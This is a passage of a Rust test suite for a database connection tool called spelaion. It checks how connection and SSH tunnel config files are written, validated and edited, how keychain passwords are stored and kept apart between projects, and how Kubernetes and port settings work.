    let draft = ConnectionDraft::from_entry(config.connection(&id).unwrap());
    let backend = FakeBackend::default();
    for broken in [
        ConnectionDraft {
            host: String::new(),
            ..draft.clone()
        },
        ConnectionDraft {
            name: "  ".into(),
            ..draft.clone()
        },
        ConnectionDraft {
            tunnel: "missing".into(),
            ..draft.clone()
        },
    ] {
        assert!(spelaion_config::update_connection(&config, &id, &broken, None, &backend).is_err());
        assert_eq!(std::fs::read_to_string(&path).unwrap(), HAND_WRITTEN);
    }
    assert!(
        spelaion_config::update_connection(&config, &ws("missing"), &draft, None, &backend)
            .is_err()
    );
}

#[test]
fn deleting_removes_the_file_its_password_and_empty_folders() {
    let fx = Fixture::new("draft-delete");
    let path = fx.write(
        "repo/.spelaion/connections/prod/eu/orders.toml",
        HAND_WRITTEN,
    );
    let keep = fx.write(
        "repo/.spelaion/connections/prod/other.toml",
        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"a.db\"\n",
    );
    let backend = FakeBackend::default();
    backend
        .keychain_set(&repo_account(&fx, "prod/eu/orders"), "secret")
        .unwrap();
    backend
        .keychain_set(&repo_account(&fx, "prod/other"), "unrelated")
        .unwrap();
    let config = load(Some(&fx.repo()), &fx.user());

    spelaion_config::delete_connection(&config, &ws("prod/eu/orders"), &backend).unwrap();
    assert!(!path.exists());
    assert!(!fx.repo().join(".spelaion/connections/prod/eu").exists());
    assert!(keep.exists(), "folders still in use are kept");
    assert!(fx.repo().join(".spelaion/connections").exists());
    let keychain = backend.keychain.lock().unwrap();
    assert!(keychain.get(&repo_account(&fx, "prod/eu/orders")).is_none());
    assert_eq!(
        keychain
            .get(&repo_account(&fx, "prod/other"))
            .map(String::as_str),
        Some("unrelated")
    );
    drop(keychain);

    let config = load(Some(&fx.repo()), &fx.user());
    assert!(config.connection(&ws("prod/eu/orders")).is_none());
    assert!(spelaion_config::delete_connection(&config, &ws("prod/eu/orders"), &backend).is_err());
}

#[test]
fn testing_an_edit_finds_the_stored_password_even_after_renaming() {
    let fx = Fixture::new("draft-edit-resolve");
    fx.write("repo/.spelaion/connections/orders.toml", HAND_WRITTEN);
    let config = load(Some(&fx.repo()), &fx.user());
    let backend = FakeBackend::default();
    backend
        .keychain_set(&repo_account(&fx, "orders"), "stored")
        .unwrap();
    let id = ws("orders");
    let draft = ConnectionDraft {
        name: "Renamed".into(),
        ..ConnectionDraft::from_entry(config.connection(&id).unwrap())
    };
    let resolved = Resolver::new(&config, &fx.trusted(), &backend)
        .resolve_edit(&id, &draft)
        .unwrap();
    assert_eq!(resolved.password, Password::Value(Secret::new("stored")));
    assert_eq!(resolved.name, "Renamed");
}

fn hop(host: &str, user: &str, auth: Vec<SshAuth>, password: PasswordChoice) -> HopDraft {
    HopDraft {
        host: host.into(),
        port: None,
        user: user.into(),
        auth,
        identity_file: String::new(),
        password,
    }
}

fn two_hop_tunnel() -> TunnelDraft {
    TunnelDraft {
        source: Source::Workspace,
        name: "Bastion EU".into(),
        hops: vec![
            hop(
                "jump.example.com",
                "ana",
                vec![SshAuth::Agent],
                PasswordChoice::None,
            ),
            hop(
                "10.0.0.5",
                "deploy",
                vec![SshAuth::Password],
                PasswordChoice::Keychain,
            ),
        ],
        options: TunnelDraftOptions::default(),
    }
}

fn kubernetes_connection(resource: &str) -> ConnectionDraft {
    ConnectionDraft {
        source: Source::Workspace,
        folder: String::new(),
        name: "Orders in cluster".into(),
        engine: Engine::Postgres,
        env: String::new(),
        host: String::new(),
        port: Some(5432),
        database: "orders".into(),
        user: "app".into(),
        password: PasswordChoice::Prompt,
        tls_mode: TlsModeConfig::Disable,
        tls_ca: String::new(),
        tls_cert: String::new(),
        tls_key: String::new(),
        tunnel: String::new(),
        local_port: None,
        sqlite3: String::new(),
        kubernetes: Some(KubernetesDraft {
            context: "kind-orders".into(),
            namespace: "shop".into(),
            resource: resource.into(),
            kubeconfig: String::new(),
            kubectl: String::new(),
        }),
        read_only: false,
        keepalive: None,
        mcp_exposed: false,
        mcp_writes: false,
    }
}

#[test]
fn kubernetes_connections_are_written_resolved_and_validated() {
    let fx = Fixture::new("conn-k8s");
    let config = load(Some(&fx.repo()), &fx.user());
    let backend = FakeBackend::default();
    let id = add_connection(
        &config,
        &kubernetes_connection("svc/orders-db"),
        None,
        &backend,
    )
    .unwrap();
    let path = fx
        .repo()
        .join(format!(".spelaion/connections/{}.toml", id.path));
    let content = std::fs::read_to_string(&path).unwrap();
    assert!(
        content.contains("[kubernetes]") && content.contains("resource = \"svc/orders-db\""),
        "{content}"
    );
    assert!(!content.contains("host"), "no host needed: {content}");
    assert!(
        !content.contains("port"),
        "the default port is implied: {content}"
    );

    let config = load(Some(&fx.repo()), &fx.user());
    assert!(config.problems.is_empty(), "{:?}", config.problems);
    let resolved = Resolver::new(&config, &fx.trusted(), &backend)
        .resolve(&id)
        .unwrap();
    assert!(resolved.tunnel.is_none());
    let k = resolved.kubernetes.unwrap();
    assert_eq!(
        (k.context.as_deref(), k.namespace.as_deref()),
        (Some("kind-orders"), Some("shop"))
    );
    assert_eq!(
        (k.resource.as_str(), k.kubectl.as_str()),
        ("svc/orders-db", "kubectl")
    );
    assert_eq!(
        (resolved.params.host.as_str(), resolved.params.port),
        ("localhost", 5432)
    );

    // Editing: another resource and port, then back to a plain connection.
    let entry = config.connection(&id).unwrap();
    let mut draft = ConnectionDraft::from_entry(entry);
    assert_eq!(draft.kubernetes.as_ref().unwrap().resource, "svc/orders-db");
    draft.kubernetes.as_mut().unwrap().resource = "deployment/orders".into();
    draft.port = Some(6432);
    spelaion_config::update_connection(&config, &id, &draft, None, &backend).unwrap();
    let content = std::fs::read_to_string(&path).unwrap();
    assert!(
        content.contains("deployment/orders") && content.contains("port = 6432"),
        "{content}"
    );
    let config = load(Some(&fx.repo()), &fx.user());
    let mut plain = ConnectionDraft::from_entry(config.connection(&id).unwrap());
    plain.kubernetes = None;
    plain.host = "db.internal".into();
    spelaion_config::update_connection(&config, &id, &plain, None, &backend).unwrap();
    let content = std::fs::read_to_string(&path).unwrap();
    assert!(
        !content.contains("kubernetes") && content.contains("db.internal"),
        "{content}"
    );

    for bad in ["orders-db", "secret/orders", "svc/", "svc/Orders_DB"] {
        let mut draft = kubernetes_connection(bad);
        draft.name = format!("bad {bad}");
        assert!(
            add_connection(&config, &draft, None, &backend).is_err(),
            "{bad}"
        );
    }
}

#[test]
fn kubernetes_and_an_ssh_tunnel_do_not_mix() {
    let fx = Fixture::new("conn-k8s-both");
    std::fs::create_dir_all(fx.repo().join(".spelaion/connections")).unwrap();
    std::fs::write(
        fx.repo().join(".spelaion/connections/mixed.toml"),
        "schema_version = 1\nengine = \"postgres\"\ndatabase = \"d\"\nuser = \"u\"\ntunnel = \"jump\"\n[kubernetes]\nresource = \"svc/db\"\n",
    )
    .unwrap();
    std::fs::write(
        fx.repo().join(".spelaion/connections/local.toml"),
        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"x.db\"\n[kubernetes]\nresource = \"svc/db\"\n",
    )
    .unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    let problems = format!("{:?}", config.problems);
    assert!(problems.contains("not both"), "{problems}");
    assert!(problems.contains("SQLite is a local file"), "{problems}");
}

#[test]
fn new_tunnels_are_written_without_secrets_and_load_back() {
    let fx = Fixture::new("tunnel-add");
    let config = load(Some(&fx.repo()), &fx.user());
    let backend = FakeBackend::default();
    let mut draft = two_hop_tunnel();
    draft.hops[0].port = Some(22);
    draft.hops[1].port = Some(2222);
    let name = add_tunnel(
        &config,
        &draft,
        &[None, Some(Secret::new("hop-secret"))],
        &backend,
    )
    .unwrap();
    assert_eq!(name, "bastion-eu");
    let path = fx.repo().join(".spelaion/tunnels/bastion-eu.toml");
    let content = std::fs::read_to_string(&path).unwrap();
    assert!(content.starts_with("#:schema "), "{content}");
    assert!(!content.contains("hop-secret"), "{content}");
    assert_eq!(
        content.matches("port").count(),
        1,
        "the default SSH port is implied: {content}"
    );
    assert_eq!(
        backend
            .keychain
            .lock()
            .unwrap()
            .get(&repo_hop(&fx, "bastion-eu", 1))
            .map(String::as_str),
        Some("hop-secret")
    );

    let config = load(Some(&fx.repo()), &fx.user());
    assert!(config.problems.is_empty(), "{:?}", config.problems);
    let entry = config.tunnel_for(Source::Workspace, "bastion-eu").unwrap();
    assert_eq!(TunnelDraft::from_entry(entry).hops.len(), 2);
    // Resolving finds the stored password for hop 2 and nothing for the agent hop.
    let resolved = Resolver::new(&config, &fx.trusted(), &backend)
        .resolve_tunnel_draft(&TunnelDraft::from_entry(entry))
        .unwrap();
    assert_eq!(resolved.hops[0].password, Password::None);
    assert_eq!(
        resolved.hops[1].password,
        Password::Value(Secret::new("hop-secret"))
    );
    assert_eq!(resolved.hops[1].port, 2222);

    assert!(
        add_tunnel(&config, &draft, &[], &backend).is_err(),
        "never overwrites"
    );
}

#[test]
fn invalid_tunnels_explain_what_is_wrong() {
    let fx = Fixture::new("tunnel-invalid");
    let config = load(Some(&fx.repo()), &fx.user());
    let error = |draft: TunnelDraft| draft.to_file(&config).unwrap_err().message;
    assert!(
        error(TunnelDraft {
            name: "??".into(),
            ..two_hop_tunnel()
        })
        .contains("name")
    );
    assert!(
        error(TunnelDraft {
            hops: vec![],
            ..two_hop_tunnel()
        })
        .contains("hop")
    );
    let mut no_host = two_hop_tunnel();
    no_host.hops[1].host = " ".into();
    assert!(error(no_host).contains("hop 2: the host"));
    let mut no_auth = two_hop_tunnel();
    no_auth.hops[0].auth.clear();
    assert!(error(no_auth).contains("hop 1"));
    // A password is only kept for methods that use it.
    let mut agent = two_hop_tunnel();
    agent.hops[0].password = PasswordChoice::Prompt;
    assert_eq!(agent.to_file(&config).unwrap().hops[0].password, None);
    // Untrusted repository: testing is refused, like for connections.
    let untrusted = TrustStore::load(&fx.user()).unwrap();
    assert!(matches!(
        Resolver::new(&config, &untrusted, &FakeBackend::default())
            .resolve_tunnel_draft(&two_hop_tunnel()),
        Err(ResolveError::Untrusted { .. })
    ));
}

const HAND_WRITTEN_TUNNEL: &str = "# Production bastions: ask the infra team before changing\nschema_version = 1\n\n[[hops]]\nhost = \"jump.example.com\" # public\nuser = \"ana\"\nauth = [\"agent\"]\ncommand = \"ssh -W %h:%p corp-gateway\"\n\n[[hops]]\nhost = \"10.0.0.5\"\nuser = \"deploy\"\nauth = [\"password\"]\npassword = { secret = \"keychain\" }\n";

#[test]
fn editing_tunnels_keeps_comments_and_commands_and_never_reuses_a_password_elsewhere() {
    let fx = Fixture::new("tunnel-edit");
    let path = fx.write("repo/.spelaion/tunnels/prod.toml", HAND_WRITTEN_TUNNEL);
    let backend = FakeBackend::default();
    backend
        .keychain_set(&repo_hop(&fx, "prod", 1), "old")
        .unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    let entry = config.tunnel_for(Source::Workspace, "prod").unwrap();

    // Same servers, new port on hop 1: comments, `command` and the stored password stay.
    let mut draft = TunnelDraft::from_entry(entry);
    draft.hops[0].port = Some(2200);
    update_tunnel(&config, Source::Workspace, "prod", &draft, &[], &backend).unwrap();
    let content = std::fs::read_to_string(&path).unwrap();
    assert!(content.starts_with("# Production bastions"), "{content}");
    assert!(
        content.contains("host = \"jump.example.com\" # public"),
        "{content}"
    );
    assert!(
        content.contains("command = \"ssh -W %h:%p corp-gateway\""),
        "{content}"
    );
    assert!(content.contains("port = 2200"), "{content}");
    assert!(
        backend
            .keychain
            .lock()
            .unwrap()
            .contains_key(&repo_hop(&fx, "prod", 1))
    );

    // Hop 2 now points to another server without a new password: the old one is forgotten,
    // so it is never sent to a host it was not meant for.
    let config = load(Some(&fx.repo()), &fx.user());
    let entry = config.tunnel_for(Source::Workspace, "prod").unwrap();
    let mut moved = TunnelDraft::from_entry(entry);
    moved.hops[1].host = "10.0.0.9".into();
    update_tunnel(&config, Source::Workspace, "prod", &moved, &[], &backend).unwrap();
    assert!(
        !backend
            .keychain
            .lock()
            .unwrap()
            .contains_key(&repo_hop(&fx, "prod", 1))
    );

    // A third hop is appended; removing it again leaves two.
    let config = load(Some(&fx.repo()), &fx.user());
    let entry = config.tunnel_for(Source::Workspace, "prod").unwrap();
    let mut longer = TunnelDraft::from_entry(entry);
    longer.hops.push(hop(
        "db-gw",
        "ana",
        vec![SshAuth::Key],
        PasswordChoice::None,
    ));
    update_tunnel(&config, Source::Workspace, "prod", &longer, &[], &backend).unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    assert!(config.problems.is_empty(), "{:?}", config.problems);
    let entry = config.tunnel_for(Source::Workspace, "prod").unwrap();
    assert_eq!(entry.file.hops.len(), 3);
    let mut shorter = TunnelDraft::from_entry(entry);
    shorter.hops.truncate(2);
    update_tunnel(&config, Source::Workspace, "prod", &shorter, &[], &backend).unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    assert_eq!(
        config
            .tunnel_for(Source::Workspace, "prod")
            .unwrap()
            .file
            .hops
            .len(),
        2
    );

    // Invalid edits leave the file as it was.
    let before = std::fs::read_to_string(&path).unwrap();
    let mut broken = shorter.clone();
    broken.hops[0].user = String::new();
    assert!(update_tunnel(&config, Source::Workspace, "prod", &broken, &[], &backend).is_err());
    assert_eq!(std::fs::read_to_string(&path).unwrap(), before);
}

#[test]
fn tunnel_keepalives_are_edited_validated_and_resolved() {
    let fx = Fixture::new("tunnel-keepalive");
    let path = fx.write("repo/.spelaion/tunnels/prod.toml", HAND_WRITTEN_TUNNEL);
    let backend = FakeBackend::default();
    let config = load(Some(&fx.repo()), &fx.user());
    let entry = config.tunnel_for(Source::Workspace, "prod").unwrap();
    assert_eq!(
        TunnelDraft::from_entry(entry).options,
        TunnelDraftOptions::default()
    );

    let mut draft = TunnelDraft::from_entry(entry);
    draft.options.keepalive_interval = Some(30);
    draft.options.keepalive_count = Some(0);
    update_tunnel(&config, Source::Workspace, "prod", &draft, &[], &backend).unwrap();
    let content = std::fs::read_to_string(&path).unwrap();
    assert!(content.starts_with("# Production bastions"), "{content}");
    assert!(content.contains("keepalive_interval = 30"), "{content}");
    assert!(content.contains("keepalive_count = 0"), "{content}");
    let config = load(Some(&fx.repo()), &fx.user());
    assert!(config.problems.is_empty(), "{:?}", config.problems);
    let entry = config.tunnel_for(Source::Workspace, "prod").unwrap();
    assert_eq!(TunnelDraft::from_entry(entry).options, draft.options);
    let settings = TunnelSettings::of(&entry.file);
    assert_eq!(
        settings.keepalive_interval,
        Some(std::time::Duration::from_secs(30))
    );
    assert_eq!(settings.keepalive_count, 0);

    // Back to the defaults: the keys leave the file.
    let mut defaults = TunnelDraft::from_entry(entry);
    defaults.options.keepalive_interval = Some(TunnelFile::DEFAULT_KEEPALIVE_INTERVAL);
    defaults.options.keepalive_count = None;
    update_tunnel(&config, Source::Workspace, "prod", &defaults, &[], &backend).unwrap();
    let content = std::fs::read_to_string(&path).unwrap();
    assert!(!content.contains("keepalive"), "{content}");
    let config = load(Some(&fx.repo()), &fx.user());
    let entry = config.tunnel_for(Source::Workspace, "prod").unwrap();
    let settings = TunnelSettings::of(&entry.file);
    assert_eq!(
        settings.keepalive_interval,
        Some(std::time::Duration::from_secs(15))
    );
    assert_eq!(settings.keepalive_count, 3);

    // 0 turns them off.
    let mut off = TunnelDraft::from_entry(entry);
    off.options.keepalive_interval = Some(0);
    update_tunnel(&config, Source::Workspace, "prod", &off, &[], &backend).unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    let entry = config.tunnel_for(Source::Workspace, "prod").unwrap();
    assert_eq!(TunnelSettings::of(&entry.file).keepalive_interval, None);

    // The connect timeout is written and resolved the same way.
    let mut timeout = TunnelDraft::from_entry(entry);
    timeout.options.connect_timeout = Some(40);
    update_tunnel(&config, Source::Workspace, "prod", &timeout, &[], &backend).unwrap();
    assert!(
        std::fs::read_to_string(&path)
            .unwrap()
            .contains("connect_timeout = 40")
    );
    let config = load(Some(&fx.repo()), &fx.user());
    let entry = config.tunnel_for(Source::Workspace, "prod").unwrap();
    assert_eq!(
        TunnelSettings::of(&entry.file).connect_timeout,
        std::time::Duration::from_secs(40)
    );
    for bad in [0, 601] {
        let mut wrong = TunnelDraft::from_entry(entry);
        wrong.options.connect_timeout = Some(bad);
        let error = wrong.to_file(&config).unwrap_err().message;
        assert!(error.contains("connect_timeout"), "{error}");
    }

    // Out of range: refused, in the form and in a hand-written file.
    let mut huge = TunnelDraft::from_entry(entry);
    huge.options.keepalive_interval = Some(100_000);
    let error = huge.to_file(&config).unwrap_err().message;
    assert!(error.contains("keepalive_interval"), "{error}");
    let mut many = TunnelDraft::from_entry(entry);
    many.options.keepalive_count = Some(5_000);
    let error = many.to_file(&config).unwrap_err().message;
    assert!(error.contains("keepalive_count"), "{error}");
    fx.write(
        "repo/.spelaion/tunnels/broken.toml",
        "schema_version = 1\nkeepalive_interval = -1\n\n[[hops]]\nhost = \"h\"\nuser = \"u\"\n",
    );
    let config = load(Some(&fx.repo()), &fx.user());
    assert!(
        config
            .problems
            .iter()
            .any(|p| p.file.ends_with("broken.toml")),
        "{:?}",
        config.problems
    );
}

#[test]
fn local_ports_come_from_the_connection_or_the_personal_range() {
    let fx = Fixture::new("local-ports");
    let path = fx.write(
        "repo/.spelaion/connections/prod/orders.toml",
        &format!("# Pinned for the reporting tool\n{ORDERS}"),
    );
    fx.write("repo/.spelaion/tunnels/bastion.toml", BASTION);
    fx.write("user/user.toml", "[vars]\ndb_user = \"ana\"\n");
    let backend = FakeBackend {
        env: BTreeMap::from([("REGION".into(), "eu".into())]),
        ..Default::default()
    };
    let resolve = |fx: &Fixture| {
        let config = load(Some(&fx.repo()), &fx.user());
        assert!(config.problems.is_empty(), "{:?}", config.problems);
        Resolver::new(&config, &fx.trusted(), &backend)
            .resolve(&ws("prod/orders"))
            .unwrap()
            .local_port
    };
    assert_eq!(resolve(&fx), LocalPort::Any);

    // The personal range applies to connections without a port of their own.
    fx.write(
        "user/user.toml",
        "[vars]\ndb_user = \"ana\"\n\n[tunnels]\nport_min = 20000\nport_max = 20010\n",
    );
    assert_eq!(
        resolve(&fx),
        LocalPort::Range {
            min: 20000,
            max: 20010
        }
    );

    // The form writes local_port (keeping comments), and the connection's port wins.
    let config = load(Some(&fx.repo()), &fx.user());
    let id = ws("prod/orders");
    let draft = ConnectionDraft {
        local_port: Some(15432),
        ..ConnectionDraft::from_entry(config.connection(&id).unwrap())
    };
    spelaion_config::update_connection(&config, &id, &draft, None, &backend).unwrap();
    let content = std::fs::read_to_string(&path).unwrap();
    assert!(
        content.starts_with("# Pinned for the reporting tool"),
        "{content}"
    );
    assert!(content.contains("local_port = 15432"), "{content}");
    assert_eq!(resolve(&fx), LocalPort::Fixed(15432));
    let config = load(Some(&fx.repo()), &fx.user());
    assert_eq!(
        ConnectionDraft::from_entry(config.connection(&id).unwrap()).local_port,
        Some(15432)
    );
    // Without a tunnel, the form leaves it out.
    let direct = ConnectionDraft {
        tunnel: String::new(),
        ..draft.clone()
    };
    assert_eq!(direct.to_file(&config).unwrap().local_port, None);
    let cleared = ConnectionDraft {
        local_port: None,
        ..draft
    };
    spelaion_config::update_connection(&config, &id, &cleared, None, &backend).unwrap();
    assert!(
        !std::fs::read_to_string(&path)
            .unwrap()
            .contains("local_port")
    );

    // Hand-written mistakes are reported, not guessed at.
    for (file, content, expected) in [
        (
            "direct.toml",
            "schema_version = 1\nengine = \"postgres\"\nhost = \"h\"\ndatabase = \"d\"\nuser = \"u\"\nlocal_port = 5433\n",
            "needs a tunnel",
        ),
        (
            "zero.toml",
            "schema_version = 1\nengine = \"postgres\"\nhost = \"h\"\ndatabase = \"d\"\nuser = \"u\"\ntunnel = \"bastion\"\nlocal_port = 0\n",
            "from 1 to 65535",
        ),
        (
            "remote.toml",
            "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"/srv/app.db\"\ntunnel = \"bastion\"\nlocal_port = 5433\n",
            "needs a tunnel",
        ),
    ] {
        let written = fx.write(&format!("repo/.spelaion/connections/{file}"), content);
        let config = load(Some(&fx.repo()), &fx.user());
        assert!(
            config
                .problems
                .iter()
                .any(|p| p.file.ends_with(file) && p.message.contains(expected)),
            "{file}: {:?}",
            config.problems
        );
        std::fs::remove_file(written).unwrap();
    }

    // A wrong personal range is reported and tunnels take any free port.
    for range in [
        "port_min = 30000\nport_max = 20000\n",
        "port_min = 30000\n",
        "port_min = 0\nport_max = 10\n",
    ] {
        fx.write(
            "user/user.toml",
            &format!("[vars]\ndb_user = \"ana\"\n\n[tunnels]\n{range}"),
        );
        let config = load(Some(&fx.repo()), &fx.user());
        assert!(
            config
                .problems
                .iter()
                .any(|p| p.message.contains("[tunnels]")),
            "{range}: {:?}",
            config.problems
        );
        assert_eq!(config.user.tunnels, Default::default());
        assert_eq!(config.user.vars["db_user"], "ana");
    }
}

#[test]
fn session_keepalives_are_written_resolved_and_refused_for_files() {
    let fx = Fixture::new("session-keepalive");
    let path = fx.write("repo/.spelaion/connections/prod/orders.toml", ORDERS);
    fx.write("repo/.spelaion/tunnels/bastion.toml", BASTION);
    fx.write("user/user.toml", "[vars]\ndb_user = \"ana\"\n");
    let backend = FakeBackend {
        env: BTreeMap::from([("REGION".into(), "eu".into())]),
        ..Default::default()
    };
    let id = ws("prod/orders");
    let resolve = |fx: &Fixture| {
        let config = load(Some(&fx.repo()), &fx.user());
        assert!(config.problems.is_empty(), "{:?}", config.problems);
        Resolver::new(&config, &fx.trusted(), &backend)
            .resolve(&ws("prod/orders"))
            .unwrap()
            .keepalive
    };
    assert_eq!(resolve(&fx), None);

    let config = load(Some(&fx.repo()), &fx.user());
    let draft = ConnectionDraft {
        keepalive: Some(300),
        ..ConnectionDraft::from_entry(config.connection(&id).unwrap())
    };
    spelaion_config::update_connection(&config, &id, &draft, None, &backend).unwrap();
    assert!(
        std::fs::read_to_string(&path)
            .unwrap()
            .contains("keepalive = 300")
    );
    assert_eq!(resolve(&fx), Some(std::time::Duration::from_secs(300)));
    // 0 turns it off and leaves the file.
    let config = load(Some(&fx.repo()), &fx.user());
    let off = ConnectionDraft {
        keepalive: Some(0),
        ..draft
    };
    spelaion_config::update_connection(&config, &id, &off, None, &backend).unwrap();
    assert!(
        !std::fs::read_to_string(&path)
            .unwrap()
            .contains("keepalive")
    );
    assert_eq!(resolve(&fx), None);

    for (file, content, expected) in [
        (
            "file.toml",
            "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"app.db\"\nkeepalive = 60\n",
            "database servers",
        ),
        (
            "long.toml",
            "schema_version = 1\nengine = \"postgres\"\nhost = \"h\"\ndatabase = \"d\"\nuser = \"u\"\nkeepalive = 100000\n",
            "at most",
        ),
    ] {
        let written = fx.write(&format!("repo/.spelaion/connections/{file}"), content);
        let config = load(Some(&fx.repo()), &fx.user());
        assert!(
            config
                .problems
                .iter()
                .any(|p| p.file.ends_with(file) && p.message.contains(expected)),
            "{file}: {:?}",
            config.problems
        );
        std::fs::remove_file(written).unwrap();
    }
}

#[test]
fn the_personal_port_range_is_saved_next_to_the_variables() {
    let fx = Fixture::new("port-range");
    let path = fx.write("user/user.toml", "# mine\n[vars]\ndb_user = \"ana\"\n");
    spelaion_config::set_tunnel_ports(&fx.user(), Some((20000, 20100))).unwrap();
    let config = load(None, &fx.user());
    assert!(config.problems.is_empty(), "{:?}", config.problems);
    assert_eq!(config.user.tunnels.range(), Ok(Some((20000, 20100))));
    assert_eq!(config.user.vars["db_user"], "ana");
    assert!(
        std::fs::read_to_string(&path)
            .unwrap()
            .starts_with("# mine")
    );
    // A wrong range never reaches the file.
    let before = std::fs::read_to_string(&path).unwrap();
    assert!(spelaion_config::set_tunnel_ports(&fx.user(), Some((300, 200))).is_err());
    assert!(spelaion_config::set_tunnel_ports(&fx.user(), Some((0, 200))).is_err());
    assert_eq!(std::fs::read_to_string(&path).unwrap(), before);
    spelaion_config::set_tunnel_ports(&fx.user(), None).unwrap();
    let content = std::fs::read_to_string(&path).unwrap();
    assert!(!content.contains("tunnels"), "{content}");
    assert!(content.contains("db_user = \"ana\""), "{content}");
}

#[test]
fn tunnels_in_use_cannot_be_deleted() {
    let fx = Fixture::new("tunnel-delete");
    let path = fx.write("repo/.spelaion/tunnels/prod.toml", HAND_WRITTEN_TUNNEL);
    fx.write(
        "repo/.spelaion/connections/orders.toml",
        "schema_version = 1\nname = \"Orders\"\nengine = \"postgres\"\nhost = \"h\"\ndatabase = \"d\"\nuser = \"u\"\ntunnel = \"prod\"\n",
    );
    let backend = FakeBackend::default();
    backend
        .keychain_set(&repo_hop(&fx, "prod", 1), "old")
        .unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    let err = delete_tunnel(&config, Source::Workspace, "prod", &backend).unwrap_err();
    assert!(err.to_string().contains("Orders"), "{err}");
    assert!(path.exists());

    std::fs::remove_file(fx.repo().join(".spelaion/connections/orders.toml")).unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    delete_tunnel(&config, Source::Workspace, "prod", &backend).unwrap();
    assert!(!path.exists());
    assert!(
        !backend
            .keychain
            .lock()
            .unwrap()
            .contains_key(&repo_hop(&fx, "prod", 1))
    );
}

#[test]
fn shared_key_paths_work_on_every_machine() {
    let fx = Fixture::new("tunnel-paths");
    let config = load(Some(&fx.repo()), &fx.user());
    let home =
        PathBuf::from(std::env::var(if cfg!(windows) { "USERPROFILE" } else { "HOME" }).unwrap());
    let mut draft = two_hop_tunnel();
    draft.hops[0].auth = vec![SshAuth::Key];
    draft.hops[0].identity_file = home.join(".ssh").join("id_ed25519").display().to_string();
    draft.hops[1].auth = vec![SshAuth::Key];
    draft.hops[1].identity_file = fx.repo().join("keys").join("deploy").display().to_string();
    let file = draft.to_file(&config).unwrap();
    assert_eq!(
        file.hops[0].identity_file.as_deref(),
        Some("~/.ssh/id_ed25519")
    );
    assert_eq!(file.hops[1].identity_file.as_deref(), Some("keys/deploy"));
    // Personal tunnels never leave this computer: paths are kept as typed.
    let personal = TunnelDraft {
        source: Source::User,
        ..draft.clone()
    };
    assert_eq!(
        personal.to_file(&config).unwrap().hops[0].identity_file,
        Some(draft.hops[0].identity_file.clone())
    );
}

/// Two projects with a connection of the same name used to share its keychain entry, so the
/// password of one project's server could be sent to the other's. Now each repository has
/// its own entries, named after its path (which its files cannot choose).
#[test]
fn projects_never_share_keychain_passwords() {
    let first = Fixture::new("keychain-project-a");
    let second = Fixture::new("keychain-project-b");
    let backend = FakeBackend::default();
    let draft = ConnectionDraft {
        folder: "prod".into(),
        name: "orders".into(),
        ..postgres_draft()
    };
    let first_config = load(Some(&first.repo()), &first.user());
    add_connection(
        &first_config,
        &draft,
        Some(&Secret::new("first-project")),
        &backend,
    )
    .unwrap();
    let second_config = load(Some(&second.repo()), &second.user());
    add_connection(&second_config, &draft, None, &backend).unwrap();

    let id = ws("prod/orders");
    let first_config = load(Some(&first.repo()), &first.user());
    let second_config = load(Some(&second.repo()), &second.user());
    assert_ne!(
        connection_account(&first_config, &id),
        connection_account(&second_config, &id)
    );
    let resolved = Resolver::new(&second_config, &second.trusted(), &backend)
        .resolve(&id)
        .unwrap();
    assert_eq!(
        resolved.password,
        Password::Prompt {
            save_to: Some(connection_account(&second_config, &id))
        },
        "the other project's password must not be used"
    );
    let resolved = Resolver::new(&first_config, &first.trusted(), &backend)
        .resolve(&id)
        .unwrap();
    assert_eq!(
        resolved.password,
        Password::Value(Secret::new("first-project"))
    );
}

#[test]
fn personal_and_repository_entries_are_separate() {
    let fx = Fixture::new("keychain-layers");
    let config = load(Some(&fx.repo()), &fx.user());
    // Personal connections keep the names they always had.
    let personal = ConnectionId {
        source: Source::User,
        path: "scratch".into(),
    };
    assert_eq!(connection_account(&config, &personal), "~/scratch/password");
    assert!(connection_account(&config, &ws("scratch")).starts_with("repo:"));
    // A personal tunnel and a repository tunnel with the same name never share a password.
    assert_ne!(
        tunnel_account(&config, Source::User, "bastion", 0),
        tunnel_account(&config, Source::Workspace, "bastion", 0)
    );
    let backend = FakeBackend::default();
    let tunnel = |source| TunnelDraft {
        source,
        ..two_hop_tunnel()
    };
    add_tunnel(
        &config,
        &tunnel(Source::User),
        &[None, Some(Secret::new("personal"))],
        &backend,
    )
    .unwrap();
    add_tunnel(&config, &tunnel(Source::Workspace), &[], &backend).unwrap();
    let config = load(Some(&fx.repo()), &fx.user());
    let resolved = Resolver::new(&config, &fx.trusted(), &backend)
        .resolve_tunnel_draft(&tunnel(Source::Workspace))
        .unwrap();
    assert!(matches!(resolved.hops[1].password, Password::Prompt { .. }));
    let resolved = Resolver::new(&config, &fx.trusted(), &backend)
        .resolve_tunnel_draft(&tunnel(Source::User))
        .unwrap();
    assert_eq!(
        resolved.hops[1].password,
        Password::Value(Secret::new("personal"))
    );
}

/// SQLite with a tunnel is a file on the server (ADR-018): its path is the server's, kept as
/// written. DuckDB may not have a tunnel, and `sqlite3` only goes with one.
#[test]
fn sqlite_files_on_a_server_go_through_a_tunnel() {
    let fx = Fixture::new("conn-sqlite-remote");
    std::fs::create_dir_all(fx.repo().join(".spelaion/connections")).unwrap();
    std::fs::create_dir_all(fx.repo().join(".spelaion/tunnels")).unwrap();
    std::fs::write(
        fx.repo().join(".spelaion/tunnels/jump.toml"),
        "schema_version = 1\n[[hops]]\nhost = \"files.internal\"\nuser = \"deploy\"\nauth = [\"agent\"]\n",
    )
    .unwrap();
    std::fs::write(
        fx.repo().join(".spelaion/connections/remote.toml"),
        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"data/app.db\"\ntunnel = \"jump\"\nsqlite3 = \"/opt/sqlite/bin/sqlite3\"\n",
    )
    .unwrap();
    std::fs::write(
        fx.repo().join(".spelaion/connections/duck.toml"),
        "schema_version = 1\nengine = \"duckdb\"\ndatabase = \"x.duckdb\"\ntunnel = \"jump\"\n",
    )
    .unwrap();
    std::fs::write(
